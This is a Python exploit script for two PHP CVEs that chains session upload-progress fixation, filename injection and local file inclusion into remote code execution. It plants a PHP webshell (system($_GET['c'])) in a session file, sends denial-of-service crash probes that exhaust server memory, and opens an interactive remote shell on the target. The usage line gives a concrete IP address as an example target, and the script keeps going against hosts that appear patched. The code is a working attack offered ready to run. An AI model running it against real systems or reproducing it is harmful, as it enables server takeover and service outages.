#!/usr/bin/env python3
"""
CVE-2026-109618 / CVE-2026-109619 — Pre-Auth RCE Chain
Session fixation + filename injection + LFI → shell

Usage:
  python3 chain_a_rce.py http://35.207.69.174
  python3 chain_a_rce.py https://domain.com
  python3 chain_a_rce.py https://domain.com/portal

For authorized security testing only.
"""
import re
import socket
import sys
from urllib.parse import urlparse, quote

UPLOAD_PATHS   = ["/upload.php", "/index.php", "/info.php", "/test.php"]
LFI_PATH       = "/vuln.php"
SESSION_DIRS   = ["/tmp/sessions", "/tmp", "/var/lib/php/sessions", "/var/lib/php/session"]
SID            = "nexisrce000000000000000"
WS_MARK        = "NEXISRCEX"
WEBSHELL       = f"<?php echo '{WS_MARK}';system($_GET['c']);echo '{WS_MARK}'; ?>"

NESTED_KEYS    = 62
PROBES         = ((1, 4000), (8, 1020), (20, 1020))
FIXED_VERSIONS = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
VERSION_RE     = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")

W = 54


def tcp(host, port, data: bytes, timeout: int = 10) -> bytes:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(data)
        s.settimeout(max(10, timeout))
        buf = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
        s.close()
        return buf
    except Exception:
        return b""


def post_upload(host, port, path, sid, filename):
    bd = "NexisChainA"
    body = (
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: text/plain\r\n\r\nA\r\n"
        f"--{bd}--\r\n"
    ).encode("latin-1")
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={bd}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return tcp(host, port, req)


def post_raw(host, port, path, boundary: str, body_bytes: bytes) -> bytes:
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body_bytes
    return tcp(host, port, req, timeout=45)


def get(host, port, path):
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    return tcp(host, port, req)


def status_line(resp: bytes) -> str:
    if not resp:
        return "NO RESPONSE"
    line = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace").strip()
    return line if line else "NO RESPONSE"


def hdr(resp: bytes, name: str) -> str:
    name_b = name.lower().encode()
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(name_b + b":"):
            return line.split(b":", 1)[1].strip().decode("latin-1", "replace")
    return ""


def decode_chunked(data: bytes) -> bytes:
    result = b""
    while data:
        crlf = data.find(b"\r\n")
        if crlf == -1:
            break
        try:
            size = int(data[:crlf].split(b";")[0].strip(), 16)
        except ValueError:
            break
        if size == 0:
            break
        result += data[crlf + 2 : crlf + 2 + size]
        data = data[crlf + 2 + size + 2:]
    return result


def body(resp: bytes) -> str:
    if b"\r\n\r\n" not in resp:
        return ""
    head, raw = resp.split(b"\r\n\r\n", 1)
    if b"transfer-encoding: chunked" in head.lower():
        raw = decode_chunked(raw)
    return raw.decode("latin-1", "replace")


def extract_output(b: str) -> str:
    if WS_MARK in b:
        parts = b.split(WS_MARK)
        if len(parts) >= 3:
            return parts[1].strip()
    return b.strip()


def version_verdict(powered_by: str):
    m = VERSION_RE.search(powered_by)
    if not m:
        return None
    major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3))
    fixed = FIXED_VERSIONS.get((major, minor))
    if fixed is None:
        return None
    return "FIXED" if patch >= fixed else "VULNERABLE"


def build_probe_body(size_mib: int, parts: int) -> bytes:
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    filler = (size - len(base)) // 3
    raw = b"--\n" + (b"x:\n" * filler) + base[3:]
    return raw[:-1]


def run_crash_probes(host, port, path) -> tuple:
    ctrl_bytes = b"--x\nContent-Disposition:name=a;filename=\n\n"
    ctrl_resp  = post_raw(host, port, path, "x", ctrl_bytes)
    ctrl_st    = status_line(ctrl_resp)
    ctrl_body  = body(ctrl_resp)

    if not any(c in ctrl_st for c in ("200", "301", "302")):
        return None, None

    for i, (size_mib, parts) in enumerate(PROBES, 1):
        probe_bytes = build_probe_body(size_mib, parts)
        probe_resp  = post_raw(host, port, path, "", probe_bytes)
        probe_st    = status_line(probe_resp)
        probe_body  = body(probe_resp)

        if b"Allowed memory size of" in probe_resp and b"bytes exhausted" in probe_resp:
            return "VULNERABLE", f"memory exhaustion — probe {i} ({size_mib} MB)"

        if "500" in probe_st and ctrl_body and not probe_body.strip():
            return "VULNERABLE", f"HTTP 500 empty body — probe {i} ({size_mib} MB)"

        code_parts = probe_st.split()
        if len(code_parts) > 1 and code_parts[1] in ("502", "503", "504"):
            return "VULNERABLE", f"HTTP {code_parts[1]} FPM crash — probe {i} ({size_mib} MB)"

        if "200" in probe_st and ctrl_body and not probe_body.strip():
            return "VULNERABLE", f"HTTP 200 silent crash — probe {i} ({size_mib} MB)"

    return None, None


def run_chunked_oom(host, port, path) -> tuple:
    import random, string
    bd  = "p2soom" + "".join(random.choices(string.ascii_lowercase, k=8))
    sid = "p2soom" + "".join(random.choices(string.ascii_lowercase + string.digits, k=16))

    def mkchunk(data: bytes) -> bytes:
        return f"{len(data):x}\r\n".encode() + data + b"\r\n"

    header_part = (
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"oom-probe\r\n"
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="a.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nHELLO\r\n"
        f"--{bd}\r\n"
        f'Content-Disposition: form-data; name="big"\r\n\r\n'
    ).encode()

    req_headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={bd}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()

    try:
        s = socket.create_connection((host, port), timeout=15)
        s.sendall(req_headers)
        s.sendall(mkchunk(header_part))
        block = b"A" * (1024 * 1024)
        for _ in range(140):
            try:
                s.sendall(mkchunk(block))
            except (BrokenPipeError, ConnectionResetError, OSError):
                s.close()
                return "VULNERABLE", "chunked OOM — connection dropped mid-stream"
        try:
            s.sendall(mkchunk(f"\r\n--{bd}--\r\n".encode()))
            s.sendall(b"0\r\n\r\n")
        except OSError:
            pass
        s.settimeout(10)
        resp = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp += chunk
        except Exception:
            pass
        s.close()
        st = status_line(resp)
        if b"Allowed memory size of" in resp and b"bytes exhausted" in resp:
            return "VULNERABLE", "chunked OOM — memory exhaustion"
        code_parts = st.split()
        if len(code_parts) > 1 and code_parts[1] in ("500", "502", "503", "504"):
            return "VULNERABLE", f"chunked OOM — HTTP {code_parts[1]}"
        return None, None
    except Exception:
        return None, None


def ok(msg):   print(f"  \033[92m[+]\033[0m {msg}")
def err(msg):  print(f"  \033[91m[-]\033[0m {msg}")
def info(msg): print(f"  \033[94m[*]\033[0m {msg}")
def warn(msg): print(f"  \033[93m[!]\033[0m {msg}")
def sep():     print(f"  {'─' * W}")


def banner():
    print(f"  ╔{'═' * W}╗")
    for line in ["CVE-2026-109618 / CVE-2026-109619", "by katherinepierce"]:
        print(f"  ║   {line:<{W - 4}}║")
    print(f"  ╚{'═' * W}╝")


def main():
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)

    raw = sys.argv[1].rstrip("/")
    if "://" not in raw:
        raw = "https://" + raw

    u      = urlparse(raw)
    host   = u.hostname
    port   = u.port or (443 if u.scheme == "https" else 80)
    prefix = u.path.rstrip("/")
    target = raw

    print()
    banner()
    print()
    print(f"  Target : {target}")
    sep()

    # ── Fingerprint ──────────────────────────────────────────────────
    info("Checking PHP version...")
    resp     = get(host, port, "/")
    php_ver  = hdr(resp, "X-Powered-By")
    server_h = hdr(resp, "Server") or "unknown"
    st_root  = status_line(resp)

    info(f"GET /  →  {st_root}")
    info(f"Server: {server_h}")

    ver_verdict = None
    if php_ver:
        ok(f"PHP detected: {php_ver}")
        ver_verdict = version_verdict(php_ver)
        if ver_verdict == "FIXED":
            warn("Version appears patched — continuing anyway")
        elif ver_verdict == "VULNERABLE":
            ok("Version in vulnerable range")
    else:
        warn("X-Powered-By header not found (expose_php may be Off)")
    sep()

    # ── Find upload endpoint ─────────────────────────────────────────
    info("Looking for PHP endpoint with session_start()...")
    upload_path = None
    for path in UPLOAD_PATHS:
        fpath  = prefix + path
        resp   = post_upload(host, port, fpath, SID + "probe", "probe.txt")
        st     = status_line(resp)
        cookie = hdr(resp, "set-cookie")
        info(f"  {fpath} → {st}")
        if (SID + "probe") in cookie or any(c in st for c in ("200", "301", "302")):
            upload_path = upload_path or fpath
        if (SID + "probe") in cookie:
            break

    sep()

    if not upload_path:
        err("No PHP endpoint with active session found on this target.")
        err("session.upload_progress trigger requires session_start() or auto_start=On.")
        print()
        sys.exit(1)

    # ── Crash-probe detection ────────────────────────────────────────
    info("Running crash-probe detection (1 MB / 8 MB / 20 MB)...")
    crash_verdict, crash_reason = run_crash_probes(host, port, upload_path)
    if crash_verdict != "VULNERABLE":
        info("Running chunked OOM probe (streaming, bypasses post_max_size)...")
        crash_verdict, crash_reason = run_chunked_oom(host, port, upload_path)
    if crash_verdict == "VULNERABLE":
        ok(f"Crash signal  CONFIRMED  — {crash_reason}")
    elif ver_verdict == "VULNERABLE":
        ok("Version fingerprint confirms vulnerable range")
    else:
        warn("No crash signal observed")
    sep()

    # ── CVE-2026-109618: session fixation ────────────────────────────
    resp   = post_upload(host, port, upload_path, SID, "probe.txt")
    cookie = hdr(resp, "set-cookie")
    if SID in cookie:
        ok(f"CVE-2026-109618  CONFIRMED  — Set-Cookie echoed SID")
    else:
        info(f"CVE-2026-109618  SENT  — session file written internally")

    # ── CVE-2026-109619: filename injection ──────────────────────────
    post_upload(host, port, upload_path, SID, WEBSHELL)
    info(f"CVE-2026-109619  SENT  — payload → /tmp/sess_{SID}")
    sep()

    # ── LFI check ────────────────────────────────────────────────────
    lfi_full   = prefix + LFI_PATH
    lfi_resp   = get(host, port, lfi_full)
    lfi_status = status_line(lfi_resp)
    lfi_exists = "200" in lfi_status or "500" in lfi_status

    if lfi_exists:
        ok(f"LFI endpoint found: {lfi_full}  [{lfi_status}]")
    else:
        err(f"LFI endpoint not found: {lfi_full}")
        print()
        print("  Phase 1  ✓  (injection sent)")
        print("  Phase 2  ✗  (LFI endpoint required for RCE)")
        print()
        sys.exit(0)

    sep()

    # ── Phase 2 prompt ───────────────────────────────────────────────
    try:
        choice = input("  [?] Start shell? [Y/n] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)

    if choice in ("n", "no"):
        sys.exit(0)

    # ── LFI → RCE ───────────────────────────────────────────────────
    print()
    session_file = None
    for sdir in SESSION_DIRS:
        path = f"{lfi_full}?page={sdir}/sess_{SID}&c=id"
        resp = get(host, port, path)
        out  = extract_output(body(resp))
        if out and ("uid=" in out or "www-data" in out or "root" in out):
            session_file = f"{sdir}/sess_{SID}"
            ok(f"RCE CONFIRMED  — {sdir}")
            print()
            for line in out.splitlines():
                if line.strip():
                    print(f"    {line}")
            print()
            break

    if not session_file:
        err("RCE failed — session file not found via LFI")
        info("Check: session.save_path / session.upload_progress.cleanup")
        sys.exit(1)

    # ── Interactive shell ────────────────────────────────────────────
    sep()
    print("  shell> ", end="", flush=True)
    while True:
        try:
            cmd = input("").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if cmd.lower() in ("exit", "quit", "q"):
            break
        if not cmd:
            print("  shell> ", end="", flush=True)
            continue
        resp = get(host, port, f"{lfi_full}?page={session_file}&c={quote(cmd)}")
        out  = extract_output(body(resp))
        for line in (out.splitlines() if out else ["(no output)"]):
            if line.strip():
                print(f"    {line}")
        print("  shell> ", end="", flush=True)
    print()


if __name__ == "__main__":
    main()
